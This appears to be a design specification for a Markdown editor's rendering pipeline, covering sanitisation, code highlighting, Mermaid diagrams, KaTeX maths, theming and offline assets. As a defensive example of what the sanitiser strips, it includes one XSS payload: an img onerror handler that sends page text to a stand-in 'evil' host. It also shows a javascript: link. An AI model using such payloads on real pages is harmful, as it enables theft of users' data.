# Rendering rich documents

## What it's for

A Markdown preview that only handles headings and bold text is a curiosity. Real technical notes have
tables, code with syntax colouring, architecture diagrams and mathematics, and an editor that renders
none of those makes you go and look at them somewhere else. This is the pipeline that turns source into
the rendered document you see in the preview pane, in Preview-only, in reading mode and in an export —
all four from one implementation, because two would disagree.

## What you can do

Write GitHub-flavoured Markdown and see it rendered as you type. Fenced code blocks are
syntax-coloured. A ` ```mermaid ` fence becomes a diagram — click it to open it full-window with zoom
and pan. At the Full standard, `$…$` and `$$…$$` become typeset mathematics.

The preview consumes the theme infrastructure from Phase 02. Theme and appearance changes recolour
highlighted code and maths immediately and re-render every open Mermaid diagram in the new palette.

Everything renders from the bundle. Nothing is fetched, so it all works with the network off.

## Rules

### One pipeline renders everywhere {#one-pipeline}
- The preview pane, the Preview arrangement, reading mode and an export all use the same renderer with
  the same plugin set and the same sanitiser.

Examples: a document shown in Split and then exported → the same output · a second renderer for export →
two answers to what the document means, and the PDF is the one nobody checks.

### The plugin order is fixed and the sanitiser runs last {#plugin-order}
- remark plugins transform the Markdown tree; rehype plugins transform the HTML tree; `rehype-sanitize`
  runs **last**, so it sees everything every other plugin produced.

Examples: `rehype-katex`, then `rehype-highlight`, then the sanitiser → correct · the sanitiser before
the highlighter → the highlighter's class names are never checked.

### Rendered HTML is always sanitised {#html-is-sanitised}
- `rehype-sanitize` is present at **every** standard level.
- Raw HTML in a document is either escaped or passed through the sanitiser, which strips scripts, event
  handler attributes and dangerous URLs.
- The schema permits the **specific** markup the active plugin set emits — the maths spans, the
  `hljs-` class prefix, the task-list checkboxes — and nothing broader.

Examples: `<img src=x onerror="fetch('http://evil/'+document.body.innerText)">` in a document → the
handler is stripped and the image renders inert · dropping the sanitiser at Minimal because "Minimal has
no HTML anyway" → raw HTML is a CommonMark feature and is exactly what arrives at Minimal.

*Why this is not optional:* the preview renders a file that came from somewhere else, inside a webview
that can call the Go backend. Unsanitised HTML in that position is remote code execution on the user's
machine.

### Fenced code is highlighted at every standard level {#code-highlighting}
- Fenced code blocks are syntax-highlighted regardless of the Markdown standard, because highlighting is
  a rendering concern rather than a Markdown feature.
- The preview activates the highlight stylesheet generated in Phase 02. Its colours come from the
  `--hl-*` tokens, so they match the appearance and agree with the editor's own colouring of the same
  fence.
- **If** the fence's language is unknown or absent, **then** it renders as a plain, unhighlighted code
  block.

Examples: ` ```go ` at the Minimal standard → highlighted · ` ```wat ` → a plain block, no error ·
a rendered fence showing exactly one colour → the highlighter ran and its stylesheet did not, which is
why the acceptance check asserts **more than one distinct colour** rather than that it rendered.

### A Mermaid fence becomes a diagram at every level {#mermaid-fences}
- A ` ```mermaid ` fence is intercepted by a component override, not a remark plugin, so it works at all
  three standard levels.
- **While** a diagram is computing, a loading placeholder is shown; on success the SVG replaces it.
- **If** the diagram's source is invalid, **then** that block shows an inline error and the rest of the
  document renders normally.

Examples: an invalid diagram in the middle of a long document → one error block, everything else reads ·
an exception escaping the block → a blank preview and no way to tell which diagram caused it.

### Diagrams take resolved colours, once {#diagram-theming}
- Mermaid's `themeVariables` is built from resolved token values read off the root element:
  `primaryColor` from `--accent-soft`, `primaryBorderColor` from `--accent`, `primaryTextColor` from
  `--text`, `lineColor` from `--muted`, `background` from `--surface`, `fontFamily` from `--font`.
- `mermaid.initialize()` is called once, and again only when the effective theme changes — not once per
  diagram per render.
- **When** the theme or appearance changes, every open diagram re-renders.

Examples: a document with four diagrams, theme switched → one `initialize`, four re-renders ·
`initialize` per diagram per render → a module-global singleton is reconfigured repeatedly and a theme
change mid-flight interleaves two palettes in one document.

*Why:* Mermaid bakes resolved colours into the SVG at render time. Styling the rendered SVG from outside
reaches almost nothing.

### Mermaid's three render lifecycle rules {#mermaid-lifecycle}
- **Mint a fresh id per render**, `${blockId}-r${n}` with a per-block counter.
- **Call `parse()` before `render()`**, so a syntax error is a clean message rather than a half-built
  node.
- **Carry a generation token per render pass**; anything arriving after a newer pass started is
  discarded, and the discard must prevent the DOM mutation, not merely suppress a state update.

Examples: two renders sharing one id → they collide, and a failed parse leaves the temporary node in the
document permanently · a stale generation allowed to mutate the DOM → a light diagram lands after the
app has switched to dark.

### A diagram can be opened full-window {#diagram-full-window}
- **When** a rendered diagram or its expand control is clicked, it opens over the app at full size with
  zoom and pan. `Esc` closes it.
- The expanded view is the **same SVG**, not a re-render, so it costs nothing beyond a viewer and
  inherits the current theme.

Examples: a twenty-node architecture diagram in a half-width preview → unreadable at any usable zoom,
which makes the feature look broken; clicking it makes it usable.

### Mermaid output bypasses the sanitiser, and strict mode is what constrains it instead {#mermaid-security}
- Mermaid's SVG is injected with `dangerouslySetInnerHTML` and therefore does not pass through
  `rehype-sanitize`.
- Mermaid is configured with `securityLevel: 'strict'`, which is what constrains it instead.

Examples: `securityLevel` left at the library default → the constraint is whatever the library decided
this release, on content that came from an untrusted file.

### Maths renders at the Full standard only {#maths-at-full}
- **While** the standard is Full, `$…$` and `$$…$$` are parsed and typeset with bundled KaTeX fonts.
- **If** an expression is invalid, **then** it renders as an inline error token and the rest of the
  document continues to render.
- At Minimal and GFM, the same text renders literally.

Examples: `$x^2$` at Full → typeset · the same at GFM → the characters `$x^2$` · `$\frac{1}{$` at Full →
one error token, the paragraph around it intact.

### Maths is styled explicitly {#maths-styling}
- Display maths sits in a block with `--surface-2` behind it.
- **If** an equation is wider than the reading column, **then** it scrolls inside its own container and
  never widens the page.
- A maths parse error renders in `--err`, not KaTeX's built-in `#cc0000`.

Examples: a 200-character equation in a 700-pixel column → a horizontal scrollbar on the equation, the
paragraph below still at its normal width.

### An unsupported feature renders literally, never as an error {#unsupported-renders-literally}
- **When** a document uses a feature above the active standard level, that syntax renders as plain text.

Examples: a GFM table at Minimal → the pipe characters, as written · a table at Minimal rendered as an
error → the user is told their document is broken when it is their setting that is narrow.

### The preview never blanks {#preview-never-blanks}
- **If** a render fails or is superseded, **then** the last successfully rendered output stays on screen.
- Pausing the preview affects only the preview: the buffer is not rolled back, the caret and selection
  do not move, and no content is discarded.

Examples: a render superseded mid-flight → the previous output remains until the new one is ready · a
blank pane between renders → a flash on every debounce tick.

### Rendering is asynchronous where it is expensive {#async-rendering}
- Mermaid and KaTeX render asynchronously, so a heavy diagram or a long formula never blocks the initial
  text paint.

Examples: a document with six diagrams → the text is readable immediately and the diagrams fill in.

### Every rendering asset is bundled {#assets-are-bundled}
- KaTeX's stylesheet and fonts, Mermaid, the highlight token styles and every UI font are imported from
  the bundle and resolved at build time.
- Nothing is fetched at runtime: no CDN script, no web font, no lazily downloaded language pack.

Examples: the app used with the network off → every diagram, formula and code block renders · a
`<link>` to a CDN stylesheet → the feature works on the developer's machine and silently fails for
anyone offline.

## What it looks like

- A rendered document — `../surface/mockup.html#material-light/editor-split`
- Preview only — `../surface/mockup.html#material-light/preview-only`
- Reading mode — `../surface/mockup.html#material-light/reading`
- The paused-preview banner — `../surface/mockup.html#material-light/paused-preview`

## When things go wrong

| Situation | What the user sees | What they can do |
|---|---|---|
| Invalid Mermaid syntax | That block shows an inline error naming the problem; the document renders around it | Fix the diagram source |
| Invalid maths | An inline error token in the error colour; the paragraph renders | Fix the expression |
| An unknown code-fence language | A plain, unhighlighted code block | Nothing — it is not an error |
| A missing local image | The image's alt text as a placeholder | Fix the path |
| A document over 2 MB | The preview pauses, with a **Refresh preview** action | Press Refresh when they want it updated |

## Edge cases

**The theme changes while a diagram is mid-render**
- *Trigger:* a large diagram is rendering when the operating system flips to dark.
- *Expected:* highlighted code and maths restyle immediately; the in-flight diagram render is discarded
  by its generation token and every diagram is re-run in the new palette.
- *Avoid:* a cancellation flag that only suppresses the state update — the in-flight render still mutates
  the document and Mermaid's global state, and a light diagram lands in a dark page.

**The theme is switched while reading mode is active**
- *Trigger:* the user is in distraction-free reading and picks a different theme.
- *Expected:* the reader, highlighted code, maths and diagrams restyle live. Chrome stays hidden.
- *Avoid:* exiting reading mode to apply the theme, or leaving a rendered block in the old palette.

**Two renders of the same block overlap**
- *Trigger:* fast typing inside a diagram's fence.
- *Expected:* each render has its own id; the older result is discarded.
- *Avoid:* a shared id, where the two renders collide and a failed parse leaves an orphan node behind
  permanently.

**A document contains a heading inside a code fence**
- *Trigger:* ` ``` ` then `# not a heading`.
- *Expected:* it renders as code, and it does not appear in the outline.
- *Avoid:* scanning the raw text for `^#`, which finds headings inside fences.

**A very long single line of code**
- *Trigger:* a minified line in a fenced block.
- *Expected:* on screen the block scrolls horizontally inside its own container; the page does not widen.
- *Avoid:* the page gaining a horizontal scrollbar, which breaks the reading column for the whole
  document.

**Raw HTML with a `javascript:` URL**
- *Trigger:* `<a href="javascript:...">click</a>` in a document.
- *Expected:* the sanitiser strips the URL; the link renders inert.
- *Avoid:* allowing the anchor and its `href` on the grounds that anchors are safe.

## Not this

- **No second Markdown parser.** Two parsers give two answers to what a document means, and they drift
  — the second one silently, because nobody checks the export against the preview.
- **No editable preview.** The preview is a rendering; editing happens in the source.
- **No plugin loading at runtime.** Every plugin is in the bundle, chosen by the standard setting.
- **No per-document standard.** One setting for the application. A per-document level is one the user
  has to remember to set on every file, and the preview then means something different per tab.
- **No Mermaid `securityLevel` above `strict`.** Loose mode allows click handlers and HTML labels in
  content that arrived from an untrusted file.

## Decisions

- *2026-07-25* — The claim that Mermaid's SVG "references theme tokens" was removed. Mermaid bakes
  resolved colours in at render time, so theming goes through `themeVariables` and every diagram
  re-renders on a theme change.
- *2026-07-25* — A rendered diagram can be opened full-window. A real architecture diagram in a
  half-width pane is unreadable at any usable zoom, which reads as broken rather than small.
- *2026-07-25* — The sanitisation allowlist is derived from the active standard level, and the CSP is
  fixed. Recorded in `../../adr/0030-sanitization-allowlist-and-csp.md`.
- *2026-07-28* — Phase 06 owns the live consumers of Phase 02's theme infrastructure: preview syntax
  activation, Mermaid theme variables and rerenders, KaTeX styling, reading-mode theme reactions and
  stale-generation rejection.

## Open questions

*(none — ready to build)*
